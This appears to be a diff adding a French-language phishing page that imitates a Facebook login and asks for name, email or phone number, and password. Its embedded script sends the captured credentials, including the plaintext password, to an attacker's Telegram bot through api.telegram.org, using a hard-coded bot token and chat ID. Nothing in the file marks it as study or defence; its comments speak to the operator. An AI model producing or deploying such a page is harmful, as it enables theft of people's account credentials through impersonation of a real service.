@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion avec Facebook</title>
+  <style>
+    .container {
+      width: 50%;
+      margin: auto;
+      text-align: center;
+      padding-top: 50px;
+    }
+
+    #facebook-logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #3b5998;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #2d4373;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img id="facebook-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
+    <h2>Connexion avec Facebook</h2>
+    <form id="login-form">
+      <label for="nom">Nom:</label><br>
+      <input type="text" id="nom" name="nom" required><br>
+
+      <label for="prenom">Prénom:</label><br>
+      <input type="text" id="prenom" name="prenom" required><br>
+
+      <label for="email">Adresse email ou numéro:</label><br>
+      <input type="email" id="email" name="email" required><br>
+
+      <label for="password">Mot de passe:</label><br>
+      <input type="password" id="password" name="password" required><br>
+
+      <label for="confirm-password">Confirmer le mot de passe:</label><br>
+      <input type="password" id="confirm-password" name="confirm-password" required><br>
+
+      <button id="login-button">Se connecter avec Facebook</button>
+    </form>
+  </div>
+
+  <script>
+    // JavaScript pour gérer la connexion avec Facebook
+    // Remarque : ce code suppose que le SDK Facebook a été chargé correctement
+
+    document.getElementById('login-button').addEventListener('click', function() {
+      // Récupérer les valeurs des champs du formulaire
+      var nom = document.getElementById('nom').value;
+      var prenom = document.getElementById('prenom').value;
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+      var confirmPassword = document.getElementById('confirm-password').value;
+
+      // Vérifier si les mots de passe correspondent
+      if (password !== confirmPassword) {
+        alert("Les mots de passe ne correspondent pas !");
+        return;
+      }
+
+      // Envoyer les données à votre bot Telegram
+      var message = "Nouvelle connexion avec Facebook :\n" +
+                    "Nom : " + nom + "\n" +
+                    "Prénom : " + prenom + "\n" +
+                    "Email ou numéro : " + email + "\n" +
+                    "Mot de passe : " + password;
+
+      // Remplacez 'VOTRE_TOKEN' par le Token de votre bot Telegram
+      var botToken ='7038227573:AAHEpb0_iL-79x53fhTUH5fB1VwoPafJRsY';
+
+      // Remplacez 'VOTRE_ID' par l'ID de votre chat Telegram
+      var chatId = '6526742520';
+
+      // URL de l'API Telegram pour envoyer un message
+      var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+      // Créer une requête HTTP POST pour envoyer le message à votre bot Telegram
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', apiUrl, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+          console.log('Message envoyé à votre bot Telegram avec succès !');
+        }
+      };
+
+      var data = JSON.stringify({
+        chat_id: chatId,
+        text: message
+      });
+
+      // Envoyer les données
+      xhr.send(data);
+    });
+  </script>
+</body>
+  </html>
